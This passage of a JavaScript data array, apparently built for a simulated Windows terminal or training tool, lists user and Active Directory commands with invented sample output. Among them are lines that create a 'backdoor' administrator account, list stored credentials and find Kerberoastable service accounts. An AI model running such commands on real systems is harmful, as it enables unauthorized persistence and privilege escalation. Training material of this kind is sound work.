      { usage: 'net user', output: 'User accounts for \\\\WORKSTATION01\n\n-------------------------------------------------------------------------------\nadmin                    Administrator            DefaultAccount\nGuest                    svcaccount               WDAGUtilityAccount\nThe command completed successfully.' },
      { usage: 'net user admin', output: 'User name                    admin\nFull Name                    Admin User\nComment\nUser\'s comment\nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            1/15/2024 8:30:22 AM\nPassword expires             Never\nPassword changeable          1/15/2024 8:30:22 AM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   1/20/2024 9:15:00 AM\n\nLogon hours allowed          All\n\nLocal Group Memberships      *Administrators       *Remote Desktop Users\nGlobal Group memberships     *None\nThe command completed successfully.' },
      { usage: 'net user backdoor P@ssw0rd123 /add', output: 'The command completed successfully.' }
    ],
    category: 'users'
  },
  {
    cmd: 'net localgroup',
    desc: 'Display or manage local group memberships',
    examples: [
      { usage: 'net localgroup Administrators', output: 'Alias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nadmin\nAdministrator\nCORP\\Domain Admins\nThe command completed successfully.' },
      { usage: 'net localgroup Administrators backdoor /add', output: 'The command completed successfully.' }
    ],
    category: 'users'
  },
  {
    cmd: 'net group',
    desc: 'Display or manage domain group memberships (domain controller only)',
    examples: [
      { usage: 'net group "Domain Admins" /domain', output: 'Group name     Domain Admins\nComment        Designated administrators of the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nadmin                    Administrator\nThe command completed successfully.' },
      { usage: 'net group "Domain Controllers" /domain', output: 'Group name     Domain Controllers\nComment        All domain controllers in the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nDC01$                    DC02$\nThe command completed successfully.' }
    ],
    category: 'users'
  },
  {
    cmd: 'whoami',
    desc: 'Display the current user name and domain',
    examples: [
      { usage: 'whoami', output: 'corp\\admin' },
      { usage: 'whoami /fqdn', output: 'CN=admin,CN=Users,DC=corp,DC=local' }
    ],
    category: 'users'
  },
  {
    cmd: 'whoami /priv',
    desc: 'Display security privileges of the current user',
    examples: [
      { usage: 'whoami /priv', output: 'PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                  Description                               State\n=============================== ========================================= ========\nSeDebugPrivilege                Debug programs                            Enabled\nSeChangeNotifyPrivilege         Bypass traverse checking                  Enabled\nSeImpersonatePrivilege          Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege         Create global objects                     Enabled\nSeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled\nSeBackupPrivilege               Back up files and directories             Disabled\nSeRestorePrivilege              Restore files and directories             Disabled\nSeShutdownPrivilege             Shut down the system                      Disabled' }
    ],
    category: 'users'
  },
  {
    cmd: 'whoami /groups',
    desc: 'Display group memberships of the current user',
    examples: [
      { usage: 'whoami /groups', output: 'GROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID                          Attributes\n========================================== ================ ============================ ==================================================\nCORP\\Domain Users                          Group            S-1-5-21-362381...-513       Mandatory group, Enabled by default\nCORP\\Domain Admins                         Group            S-1-5-21-362381...-512       Mandatory group, Enabled by default\nBUILTIN\\Administrators                     Alias            S-1-5-32-544                 Mandatory group, Enabled by default, Group owner\nBUILTIN\\Remote Desktop Users               Alias            S-1-5-32-555                 Mandatory group, Enabled by default\nNT AUTHORITY\\INTERACTIVE                   Well-known group S-1-5-4                      Mandatory group, Enabled by default\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11                     Mandatory group, Enabled by default' }
    ],
    category: 'users'
  },
  {
    cmd: 'Get-LocalUser',
    desc: 'PowerShell cmdlet to list local user accounts',
    examples: [
      { usage: 'Get-LocalUser', output: 'Name               Enabled Description\n----               ------- -----------\nadmin              True\nAdministrator      False   Built-in account for administering the computer/domain\nDefaultAccount     False   A user account managed by the system.\nGuest              False   Built-in account for guest access to the computer/domain\nsvcaccount         True    Service Account\nWDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scenarios.' },
      { usage: 'Get-LocalUser | Where-Object { $_.Enabled -eq $true } | Select-Object Name,LastLogon,PasswordLastSet', output: 'Name        LastLogon             PasswordLastSet\n----        ---------             ---------------\nadmin       1/20/2024 9:15:00 AM  1/15/2024 8:30:22 AM\nsvcaccount  1/18/2024 2:00:00 AM  6/15/2023 10:00:00 AM' }
    ],
    category: 'users'
  },
  {
    cmd: 'Get-LocalGroup',
    desc: 'PowerShell cmdlet to list local groups',
    examples: [
      { usage: 'Get-LocalGroup', output: 'Name                              Description\n----                              -----------\nAccess Control Assistance Opera... Members of this group can remotely query authorization...\nAdministrators                    Administrators have complete and unrestricted access...\nBackup Operators                  Backup Operators can override security restrictions...\nDistributed COM Users             Members are allowed to launch, activate and use...\nEvent Log Readers                 Members of this group can read event logs...\nHyper-V Administrators            Members of this group have complete and unrestricted...\nRemote Desktop Users              Members in this group are granted the right to logon...\nRemote Management Users           Members of this group can access WMI resources...\nUsers                             Users are prevented from making accidental or intentional...' }
    ],
    category: 'users'
  },
  {
    cmd: 'Get-LocalGroupMember',
    desc: 'PowerShell cmdlet to list members of a local group',
    examples: [
      { usage: 'Get-LocalGroupMember -Group "Administrators"', output: 'ObjectClass Name                  PrincipalSource\n----------- ----                  ---------------\nUser        WORKSTATION01\\admin   Local\nUser        WORKSTATION01\\Administrator Local\nGroup       CORP\\Domain Admins    ActiveDirectory' },
      { usage: 'Get-LocalGroupMember -Group "Remote Desktop Users"', output: 'ObjectClass Name                  PrincipalSource\n----------- ----                  ---------------\nUser        WORKSTATION01\\admin   Local\nGroup       CORP\\Remote Desktop Users ActiveDirectory' }
    ],
    category: 'users'
  },
  {
    cmd: 'wmic useraccount list brief',
    desc: 'List all user accounts via WMI with status information',
    examples: [
      { usage: 'wmic useraccount list brief', output: 'AccountType  Domain         Disabled  FullName      LocalAccount  Name              SID\n512          WORKSTATION01  FALSE                   TRUE          admin             S-1-5-21-...1001\n512          WORKSTATION01  TRUE                    TRUE          Administrator     S-1-5-21-...500\n512          WORKSTATION01  TRUE                    TRUE          DefaultAccount    S-1-5-21-...503\n512          WORKSTATION01  TRUE                    TRUE          Guest             S-1-5-21-...501\n512          WORKSTATION01  FALSE     Service Acct  TRUE          svcaccount        S-1-5-21-...1002' }
    ],
    category: 'users'
  },
  {
    cmd: 'cmdkey /list',
    desc: 'List stored Windows credentials',
    examples: [
      { usage: 'cmdkey /list', output: 'Currently stored credentials:\n\n    Target: Domain:interactive=CORP\\admin\n    Type: Domain Password\n    User: CORP\\admin\n\n    Target: TERMSRV/dc01.corp.local\n    Type: Domain Password\n    User: CORP\\admin\n\n    Target: WindowsLive:target=virtualapp/didlogical\n    Type: Generic\n    User: 02abcdefghijklmn' }
    ],
    category: 'users'
  },
  {
    cmd: 'runas',
    desc: 'Execute a command under a different user context',
    examples: [
      { usage: 'runas /user:CORP\\admin "cmd.exe"', output: 'Enter the password for CORP\\admin:\nAttempting to start cmd.exe as user "CORP\\admin" ...' },
      { usage: 'runas /netonly /user:CORP\\admin "powershell.exe"', output: 'Enter the password for CORP\\admin:\nAttempting to start powershell.exe as user "CORP\\admin" ...' }
    ],
    category: 'users'
  },
  {
    cmd: 'net accounts',
    desc: 'Display or configure password and logon policies',
    examples: [
      { usage: 'net accounts', output: 'Force user logoff how long after time expires?:       Never\nMinimum password age (days):                          1\nMaximum password age (days):                          90\nMinimum password length:                              8\nLength of password history maintained:                 12\nLockout threshold:                                    5\nLockout duration (minutes):                           30\nLockout observation window (minutes):                 30\nComputer role:                                        WORKSTATION\nThe command completed successfully.' },
      { usage: 'net accounts /domain', output: 'Force user logoff how long after time expires?:       Never\nMinimum password age (days):                          1\nMaximum password age (days):                          90\nMinimum password length:                              12\nLength of password history maintained:                 24\nLockout threshold:                                    3\nLockout duration (minutes):                           30\nLockout observation window (minutes):                 30\nComputer role:                                        PRIMARY\nThe command completed successfully.' }
    ],
    category: 'users'
  },
  {
    cmd: 'wmic group list brief',
    desc: 'List all local groups via WMI',
    examples: [
      { usage: 'wmic group list brief', output: 'Domain         Name                              SID\nWORKSTATION01  Administrators                    S-1-5-32-544\nWORKSTATION01  Backup Operators                  S-1-5-32-551\nWORKSTATION01  Event Log Readers                 S-1-5-32-573\nWORKSTATION01  Remote Desktop Users              S-1-5-32-555\nWORKSTATION01  Remote Management Users           S-1-5-32-580\nWORKSTATION01  Users                             S-1-5-32-545' }
    ],
    category: 'users'
  },
  {
    cmd: 'quser',
    desc: 'Display information about users logged on to the system',
    examples: [
      { usage: 'quser', output: ' USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\n admin                 console             1  Active      none   1/20/2024 9:15 AM\n svcaccount                                2  Disc           3  1/18/2024 2:00 AM' }
    ],
    category: 'users'
  },
  {
    cmd: 'query user',
    desc: 'Query currently logged on users on the system',
    examples: [
      { usage: 'query user /server:DC01', output: ' USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\n administrator         rdp-tcp#0           2  Active         .   1/20/2024 8:00 AM' }
    ],
    category: 'users'
  },
  {
    cmd: 'net user /domain',
    desc: 'List all domain user accounts',
    examples: [
      { usage: 'net user /domain', output: 'The request will be processed at a domain controller for domain corp.local.\n\nUser accounts for \\\\DC01.corp.local\n\n-------------------------------------------------------------------------------\nadmin                    Administrator            Guest\njsmith                   jdoe                     krbtgt\nsql_svc                  web_svc                  backup_svc\nThe command completed successfully.' }
    ],
    category: 'users'
  },
  {
    cmd: 'Get-WmiObject Win32_UserAccount',
    desc: 'PowerShell WMI query for all user accounts including domain',
    examples: [
      { usage: 'Get-WmiObject Win32_UserAccount -Filter "LocalAccount=True" | Select-Object Name,Disabled,Lockout,PasswordRequired,SID', output: 'Name           Disabled Lockout PasswordRequired SID\n----           -------- ------- ---------------- ---\nadmin          False    False   True             S-1-5-21-...1001\nAdministrator  True     False   True             S-1-5-21-...500\nGuest          True     False   False            S-1-5-21-...501\nsvcaccount     False    False   True             S-1-5-21-...1002' }
    ],
    category: 'users'
  },
  {
    cmd: 'wmic netlogin list brief',
    desc: 'Display network login information for user accounts',
    examples: [
      { usage: 'wmic netlogin where "BadPasswordCount>0" get Name,BadPasswordCount,LastLogon', output: 'BadPasswordCount  LastLogon                  Name\n3                 20240120091500.000000-360   CORP\\jsmith\n1                 20240119143022.000000-360   CORP\\jdoe' }
    ],
    category: 'users'
  },
  {
    cmd: 'net user admin /times',
    desc: 'Display allowed logon times for a user account',
    examples: [
      { usage: 'net user admin /times:M-F,8am-6pm', output: 'The command completed successfully.' }
    ],
    category: 'users'
  },
  {
    cmd: 'secedit /export /cfg C:\\temp\\secpol.inf',
    desc: 'Export local security policy settings to a file',
    examples: [
      { usage: 'secedit /export /cfg C:\\temp\\secpol.inf /areas USER_RIGHTS', output: 'The task has completed successfully.\nSee log %windir%\\security\\logs\\scesrv.log for detail info.' }
    ],
    category: 'users'
  },
  {
    cmd: 'Get-Acl',
    desc: 'PowerShell cmdlet to display access control lists on files and registry keys',
    examples: [
      { usage: 'Get-Acl C:\\Windows\\System32\\config\\SAM | Format-List', output: 'Path   : Microsoft.PowerShell.Core\\FileSystem::C:\\Windows\\System32\\config\\SAM\nOwner  : NT AUTHORITY\\SYSTEM\nGroup  : NT AUTHORITY\\SYSTEM\nAccess : NT AUTHORITY\\SYSTEM Allow  FullControl\n         BUILTIN\\Administrators Allow  FullControl' }
    ],
    category: 'users'
  },
  {
    cmd: 'icacls',
    desc: 'Display or modify discretionary access control lists on files and directories',
    examples: [
      { usage: 'icacls C:\\inetpub\\wwwroot', output: 'C:\\inetpub\\wwwroot NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n                   BUILTIN\\Administrators:(OI)(CI)(F)\n                   BUILTIN\\IIS_IUSRS:(OI)(CI)(RX)\n                   BUILTIN\\Users:(OI)(CI)(RX)\n\nSuccessfully processed 1 files; Failed processing 0 files' },
      { usage: 'icacls C:\\temp\\secret.txt /grant admin:F', output: 'processed file: C:\\temp\\secret.txt\nSuccessfully processed 1 files; Failed processing 0 files' }
    ],
    category: 'users'
  },
  {
    cmd: 'accesschk.exe',
    desc: 'Sysinternals tool to check effective permissions for users on files, registry, and services',
    examples: [
      { usage: 'accesschk.exe -uwcqv "Authenticated Users" * /accepteula', output: 'RW SSDPSRV\n        SERVICE_ALL_ACCESS\nRW upnphost\n        SERVICE_ALL_ACCESS\nRW VMTools\n        SERVICE_QUERY_STATUS\n        SERVICE_QUERY_CONFIG\n        SERVICE_INTERROGATE\n        SERVICE_ENUMERATE_DEPENDENTS\n        SERVICE_START\n        SERVICE_STOP\n        READ_CONTROL' }
    ],
    category: 'users'
  },
  {
    cmd: 'cmdkey /add',
    desc: 'Add or update stored credentials in Windows Credential Manager',
    examples: [
      { usage: 'cmdkey /add:dc01.corp.local /user:CORP\\admin /pass:P@ssw0rd', output: 'CMDKEY: Credential added successfully.' },
      { usage: 'cmdkey /delete:dc01.corp.local', output: 'CMDKEY: Credential deleted successfully.' }
    ],
    category: 'users'
  },
  {
    cmd: 'cipher /c',
    desc: 'Display encryption status of files and directories',
    examples: [
      { usage: 'cipher /c C:\\Users\\admin\\Documents\\sensitive.docx', output: ' Listing C:\\Users\\admin\\Documents\\\n  E sensitive.docx\n    Compatibility Level:\n        Windows Vista/Server 2008\n    Users who can decrypt:\n        CORP\\admin [admin(admin@corp.local)]\n        Certificate thumbprint: ABCD 1234 5678 EFGH\n    Recovery Agents:\n        CORP\\Administrator\n        Certificate thumbprint: 9012 3456 7890 IJKL' }
    ],
    category: 'users'
  },

  // ============================================================
  // AD - Active Directory (27 commands)
  // ============================================================
  {
    cmd: 'Get-ADUser',
    desc: 'Query Active Directory user accounts with filtering and property selection',
    examples: [
      { usage: 'Get-ADUser -Filter * -Properties LastLogonDate,PasswordLastSet | Select-Object Name,SamAccountName,LastLogonDate,PasswordLastSet,Enabled | Sort-Object LastLogonDate', output: 'Name           SamAccountName  LastLogonDate          PasswordLastSet        Enabled\n----           --------------  -------------          ---------------        -------\nGuest          Guest                                                         False\nkrbtgt         krbtgt                                 1/1/2023 10:00:00 AM   False\nJohn Smith     jsmith          1/20/2024 9:00:00 AM   12/1/2023 2:15:00 PM   True\nJane Doe       jdoe            1/19/2024 3:30:00 PM   11/15/2023 9:00:00 AM  True\nAdmin          admin           1/20/2024 9:15:00 AM   1/15/2024 8:30:22 AM   True\nSQL Service    sql_svc         1/18/2024 2:00:00 AM   6/15/2023 10:00:00 AM  True' },
      { usage: 'Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires | Select-Object Name,SamAccountName', output: 'Name           SamAccountName\n----           --------------\nSQL Service    sql_svc\nWeb Service    web_svc\nBackup Service backup_svc' },
      { usage: 'Get-ADUser -Identity admin -Properties *', output: 'AccountExpirationDate     :\nAccountLockoutTime        :\nBadLogonCount             : 0\nCity                      :\nCreated                   : 1/1/2023 10:00:00 AM\nDescription               : Domain Administrator\nDisplayName               : Admin User\nDistinguishedName         : CN=admin,CN=Users,DC=corp,DC=local\nEnabled                   : True\nGivenName                 : Admin\nLastBadPasswordAttempt    :\nLastLogonDate             : 1/20/2024 9:15:00 AM\nLockedOut                 : False\nMemberOf                  : {CN=Domain Admins,CN=Users,DC=corp,DC=local, CN=Administrators,...}\nPasswordLastSet           : 1/15/2024 8:30:22 AM\nPasswordNeverExpires      : False\nSamAccountName            : admin\nServicePrincipalNames     : {}\nSurname                   : User\nUserPrincipalName         : admin@corp.local' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADGroup',
    desc: 'Query Active Directory groups',
    examples: [
      { usage: 'Get-ADGroup -Filter * | Select-Object Name,GroupCategory,GroupScope | Sort-Object Name', output: 'Name                    GroupCategory GroupScope\n----                    ------------- ----------\nBackup Operators        Security      DomainLocal\nDomain Admins           Security      Global\nDomain Computers        Security      Global\nDomain Controllers      Security      Global\nDomain Users            Security      Global\nEnterprise Admins       Security      Universal\nGroup Policy Admins     Security      Global\nProtected Users         Security      Global\nSchema Admins           Security      Universal' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADGroupMember',
    desc: 'List members of an Active Directory group',
    examples: [
      { usage: 'Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name,SamAccountName,objectClass', output: 'Name           SamAccountName  objectClass\n----           --------------  -----------\nAdmin          admin           user\nAdministrator  Administrator   user' },
      { usage: 'Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object Name,SamAccountName', output: 'Name           SamAccountName\n----           --------------\nAdmin          admin\nAdministrator  Administrator' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADComputer',
    desc: 'Query Active Directory computer objects',
    examples: [
      { usage: 'Get-ADComputer -Filter * -Properties OperatingSystem,LastLogonDate | Select-Object Name,OperatingSystem,LastLogonDate,Enabled', output: 'Name           OperatingSystem                  LastLogonDate          Enabled\n----           ---------------                  -------------          -------\nDC01           Windows Server 2022 Standard     1/20/2024 8:00:00 AM   True\nDC02           Windows Server 2022 Standard     1/20/2024 8:05:00 AM   True\nFILESERVER     Windows Server 2019 Standard     1/20/2024 7:45:00 AM   True\nSQLSERVER      Windows Server 2019 Standard     1/19/2024 11:00:00 PM  True\nWORKSTATION01  Windows 10 Pro                   1/20/2024 9:15:00 AM   True\nWORKSTATION02  Windows 10 Pro                   1/18/2024 5:30:00 PM   True' },
      { usage: 'Get-ADComputer -Filter {OperatingSystem -like "*Server*"} -Properties OperatingSystem | Select-Object Name,OperatingSystem', output: 'Name        OperatingSystem\n----        ---------------\nDC01        Windows Server 2022 Standard\nDC02        Windows Server 2022 Standard\nFILESERVER  Windows Server 2019 Standard\nSQLSERVER   Windows Server 2019 Standard' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADDomain',
    desc: 'Display detailed information about the Active Directory domain',
    examples: [
      { usage: 'Get-ADDomain', output: 'AllowedDNSSuffixes                 : {}\nChildDomains                       : {}\nComputersContainer                 : CN=Computers,DC=corp,DC=local\nDeletedObjectsContainer            : CN=Deleted Objects,DC=corp,DC=local\nDistinguishedName                  : DC=corp,DC=local\nDNSRoot                            : corp.local\nDomainControllersContainer         : OU=Domain Controllers,DC=corp,DC=local\nDomainMode                         : Windows2016Domain\nDomainSID                          : S-1-5-21-3623811015-3361044348-30300820\nForest                             : corp.local\nInfrastructureMaster               : DC01.corp.local\nName                               : CORP\nNetBIOSName                        : CORP\nPDCEmulator                        : DC01.corp.local\nRIDMaster                          : DC01.corp.local\nUsersContainer                     : CN=Users,DC=corp,DC=local' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADForest',
    desc: 'Display Active Directory forest information',
    examples: [
      { usage: 'Get-ADForest', output: 'ApplicationPartitions : {DC=DomainDnsZones,DC=corp,DC=local, DC=ForestDnsZones,DC=corp,DC=local}\nCrossForestReferences : {}\nDomainNamingMaster    : DC01.corp.local\nDomains               : {corp.local}\nForestMode            : Windows2016Forest\nGlobalCatalogs        : {DC01.corp.local, DC02.corp.local}\nName                  : corp.local\nRootDomain            : corp.local\nSchemaMaster          : DC01.corp.local\nSites                 : {Default-First-Site-Name}\nSPNSuffixes           : {}\nUPNSuffixes           : {}' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADDomainController',
    desc: 'List Active Directory domain controllers',
    examples: [
      { usage: 'Get-ADDomainController -Filter * | Select-Object Name,IPv4Address,OperatingSystem,Site,IsGlobalCatalog', output: 'Name  IPv4Address    OperatingSystem                  Site                      IsGlobalCatalog\n----  -----------    ---------------                  ----                      ---------------\nDC01  192.168.1.100  Windows Server 2022 Standard     Default-First-Site-Name   True\nDC02  192.168.1.101  Windows Server 2022 Standard     Default-First-Site-Name   True' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADObject',
    desc: 'Search for Active Directory objects with LDAP filters',
    examples: [
      { usage: 'Get-ADObject -LDAPFilter "(objectClass=computer)" -SearchBase "DC=corp,DC=local" | Select-Object Name,ObjectClass,DistinguishedName', output: 'Name           ObjectClass DistinguishedName\n----           ----------- -----------------\nDC01           computer    CN=DC01,OU=Domain Controllers,DC=corp,DC=local\nDC02           computer    CN=DC02,OU=Domain Controllers,DC=corp,DC=local\nFILESERVER     computer    CN=FILESERVER,CN=Computers,DC=corp,DC=local\nWORKSTATION01  computer    CN=WORKSTATION01,CN=Computers,DC=corp,DC=local' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADOrganizationalUnit',
    desc: 'List Active Directory organizational units',
    examples: [
      { usage: 'Get-ADOrganizationalUnit -Filter * | Select-Object Name,DistinguishedName', output: 'Name                DistinguishedName\n----                -----------------\nDomain Controllers  OU=Domain Controllers,DC=corp,DC=local\nWorkstations        OU=Workstations,DC=corp,DC=local\nServers             OU=Servers,DC=corp,DC=local\nService Accounts    OU=Service Accounts,DC=corp,DC=local\nDisabled Users      OU=Disabled Users,DC=corp,DC=local' }
    ],
    category: 'AD'
  },
  {
    cmd: 'dsquery user',
    desc: 'Search Active Directory for user objects using dsquery',
    examples: [
      { usage: 'dsquery user -inactive 4', output: '"CN=Guest,CN=Users,DC=corp,DC=local"\n"CN=krbtgt,CN=Users,DC=corp,DC=local"\n"CN=Old Employee,OU=Disabled Users,DC=corp,DC=local"' },
      { usage: 'dsquery user -disabled', output: '"CN=Guest,CN=Users,DC=corp,DC=local"\n"CN=krbtgt,CN=Users,DC=corp,DC=local"\n"CN=DefaultAccount,CN=Users,DC=corp,DC=local"' }
    ],
    category: 'AD'
  },
  {
    cmd: 'dsquery computer',
    desc: 'Search Active Directory for computer objects',
    examples: [
      { usage: 'dsquery computer -stalepwd 30', output: '"CN=OLDPC01,CN=Computers,DC=corp,DC=local"\n"CN=TESTVM,CN=Computers,DC=corp,DC=local"' }
    ],
    category: 'AD'
  },
  {
    cmd: 'dsget user',
    desc: 'Display attributes of Active Directory user objects',
    examples: [
      { usage: 'dsget user "CN=admin,CN=Users,DC=corp,DC=local" -memberof', output: '"CN=Domain Admins,CN=Users,DC=corp,DC=local"\n"CN=Administrators,CN=Builtin,DC=corp,DC=local"\n"CN=Schema Admins,CN=Users,DC=corp,DC=local"\n"CN=Enterprise Admins,CN=Users,DC=corp,DC=local"\n"CN=Group Policy Creator Owners,CN=Users,DC=corp,DC=local"' }
    ],
    category: 'AD'
  },
  {
    cmd: 'dsmod user',
    desc: 'Modify attributes of an Active Directory user object',
    examples: [
      { usage: 'dsmod user "CN=jsmith,CN=Users,DC=corp,DC=local" -pwd NewP@ss2024! -mustchpwd yes', output: 'dsmod succeeded:CN=jsmith,CN=Users,DC=corp,DC=local' }
    ],
    category: 'AD'
  },
  {
    cmd: 'nltest /dclist:corp.local',
    desc: 'List domain controllers using nltest',
    examples: [
      { usage: 'nltest /dclist:corp.local', output: 'Get list of DCs in domain \'corp.local\' from \'\\\\DC01.corp.local\'.\n    DC01.corp.local [PDC]  [DS] Site: Default-First-Site-Name\n    DC02.corp.local        [DS] Site: Default-First-Site-Name\nThe command completed successfully' },
      { usage: 'nltest /dsgetdc:corp.local', output: '           DC: \\\\DC01.corp.local\n      Address: \\\\192.168.1.100\n     Dom Guid: 12345678-abcd-efgh-ijkl-123456789012\n     Dom Name: corp.local\n  Forest Name: corp.local\n Dc Site Name: Default-First-Site-Name\nOur Site Name: Default-First-Site-Name\n        Flags: PDC GC DS LDAP KDC TIMESERV WRITABLE DNS_DC DNS_DOMAIN DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10\nThe command completed successfully' }
    ],
    category: 'AD'
  },
  {
    cmd: 'nltest /domain_trusts',
    desc: 'Enumerate domain trust relationships',
    examples: [
      { usage: 'nltest /domain_trusts /all_trusts', output: 'List of domain trusts:\n    0: CORP corp.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)\n    1: PARTNER partner.local (NT 5) (Forest: 2) (Direct Outbound) (Direct Inbound)\nThe command completed successfully' }
    ],
    category: 'AD'
  },
  {
    cmd: 'gpresult /r',
    desc: 'Display Resultant Set of Policy (RSoP) information for the current user and computer',
    examples: [
      { usage: 'gpresult /r', output: 'COMPUTER SETTINGS\n-----------------\n    CN=WORKSTATION01,CN=Computers,DC=corp,DC=local\n    Last time Group Policy was applied: 1/20/2024 at 8:30:15 AM\n    Group Policy was applied from:      DC01.corp.local\n    Applied Group Policy Objects:\n        Default Domain Policy\n        Workstation Security Policy\n        Software Restriction Policy\n\nUSER SETTINGS\n-------------\n    CN=admin,CN=Users,DC=corp,DC=local\n    Last time Group Policy was applied: 1/20/2024 at 9:15:00 AM\n    Group Policy was applied from:      DC01.corp.local\n    Applied Group Policy Objects:\n        Default Domain Policy\n        Admin Desktop Policy' },
      { usage: 'gpresult /h C:\\temp\\gpresult.html', output: 'INFO: The user does not have RSoP data.\nINFO: The computer does not have RSoP data.' }
    ],
    category: 'AD'
  },
  {
    cmd: 'gpupdate /force',
    desc: 'Force an immediate refresh of Group Policy settings',
    examples: [
      { usage: 'gpupdate /force', output: 'Updating policy...\n\nComputer Policy update has completed successfully.\nUser Policy update has completed successfully.' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-GPO -All',
    desc: 'List all Group Policy Objects in the domain',
    examples: [
      { usage: 'Get-GPO -All | Select-Object DisplayName,GpoStatus,CreationTime,ModificationTime', output: 'DisplayName                    GpoStatus   CreationTime           ModificationTime\n-----------                    ---------   ------------           ----------------\nDefault Domain Policy          AllSettingsEnabled 1/1/2023 10:00:00 AM   12/1/2023 2:00:00 PM\nDefault Domain Controllers Policy AllSettingsEnabled 1/1/2023 10:00:00 AM   1/1/2023 10:00:00 AM\nWorkstation Security Policy    AllSettingsEnabled 3/15/2023 9:00:00 AM   11/20/2023 4:30:00 PM\nSoftware Restriction Policy    AllSettingsEnabled 6/1/2023 11:00:00 AM   1/10/2024 8:00:00 AM' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADUser -Filter * -Properties ServicePrincipalNames',
    desc: 'Find Kerberoastable user accounts with SPNs set',
    examples: [
      { usage: 'Get-ADUser -Filter {ServicePrincipalNames -ne "$null"} -Properties ServicePrincipalNames,PasswordLastSet | Select-Object Name,ServicePrincipalNames,PasswordLastSet', output: 'Name        ServicePrincipalNames                   PasswordLastSet\n----        ---------------------                   ---------------\nSQL Service {MSSQLSvc/sqlserver.corp.local:1433}    6/15/2023 10:00:00 AM\nWeb Service {HTTP/webserver.corp.local}              8/20/2023 3:00:00 PM' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADUser -Filter {AdminCount -eq 1}',
    desc: 'Find accounts with AdminCount set indicating privileged AD accounts',
    examples: [
      { usage: 'Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount,MemberOf | Select-Object Name,SamAccountName', output: 'Name           SamAccountName\n----           --------------\nAdmin          admin\nAdministrator  Administrator\nkrbtgt         krbtgt' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ACL "AD:\\DC=corp,DC=local"',
    desc: 'Display the access control list on an Active Directory object',
    examples: [
      { usage: 'Get-ACL "AD:\\DC=corp,DC=local" | Select-Object -ExpandProperty Access | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" } | Select-Object IdentityReference,ActiveDirectoryRights', output: 'IdentityReference              ActiveDirectoryRights\n-----------------              ---------------------\nCORP\\Domain Admins             GenericAll\nCORP\\Enterprise Admins         GenericAll\nNT AUTHORITY\\SYSTEM            GenericAll' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADTrust -Filter *',
    desc: 'List all Active Directory trust relationships',
    examples: [
      { usage: 'Get-ADTrust -Filter * | Select-Object Name,TrustType,Direction,DisallowTransivity', output: 'Name           TrustType Direction      DisallowTransivity\n----           --------- ---------      ------------------\npartner.local  Forest    Bidirectional  False' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADReplicationSite -Filter *',
    desc: 'List Active Directory replication sites',
    examples: [
      { usage: 'Get-ADReplicationSite -Filter * | Select-Object Name,Description', output: 'Name                        Description\n----                        -----------\nDefault-First-Site-Name     Default AD site' }
    ],
    category: 'AD'
  },
  {
    cmd: 'repadmin /showrepl',
    desc: 'Display Active Directory replication status',
    examples: [
      { usage: 'repadmin /showrepl', output: 'Repadmin: running command /showrepl against full DC DC01.corp.local\nDefault-First-Site-Name\\DC01\nDSA Options: IS_GC\nSite Options: (none)\nDSA object GUID: 12345678-abcd-efgh-ijkl-123456789012\nDSA invocationID: abcdefgh-1234-5678-9012-abcdef123456\n\n==== INBOUND NEIGHBORS ======================================\n\nDC=corp,DC=local\n    Default-First-Site-Name\\DC02 via RPC\n        DSA object GUID: 87654321-dcba-hgfe-lkji-210987654321\n        Last attempt @ 2024-01-20 08:30:00 was successful.' }
    ],
    category: 'AD'
  },
  {
    cmd: 'Get-ADDefaultDomainPasswordPolicy',
    desc: 'Display the default domain password policy',
    examples: [
      { usage: 'Get-ADDefaultDomainPasswordPolicy', output: 'ComplexityEnabled           : True\nDistinguishedName           : DC=corp,DC=local\nLockoutDuration             : 00:30:00\nLockoutObservationWindow    : 00:30:00\nLockoutThreshold            : 3\nMaxPasswordAge              : 90.00:00:00\nMinPasswordAge              : 1.00:00:00\nMinPasswordLength           : 12\nPasswordHistoryCount        : 24\nReversibleEncryptionEnabled : False' }
    ],
    category: 'AD'
  },
  {
    cmd: 'setspn -L',
    desc: 'List Service Principal Names registered for a user or computer account',
    examples: [
      { usage: 'setspn -L sql_svc', output: 'Registered ServicePrincipalNames for CN=SQL Service,CN=Users,DC=corp,DC=local:\n        MSSQLSvc/sqlserver.corp.local:1433\n        MSSQLSvc/sqlserver.corp.local' },
